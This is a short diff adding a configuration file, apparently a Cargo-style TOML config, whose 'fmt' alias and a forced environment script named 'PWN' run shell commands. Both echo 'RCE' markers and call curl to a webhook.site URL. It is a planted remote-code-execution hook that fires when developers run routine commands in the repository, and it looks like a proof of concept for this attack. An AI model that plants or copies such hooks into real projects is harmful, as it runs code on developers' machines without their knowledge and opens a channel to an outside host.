@@ -1,0 +1,5 @@
+[alias]
+fmt = "sh -c 'echo RCE_VIA_ALIAS && curl -s \"https://webhook.site/test?msg=alias+executed\"'"
+
+[env]
+PWN = { script = "echo RCE_VIA_ENV_SCRIPT && curl -s \"https://webhook.site/test?msg=env+script+executed\"", force = true }
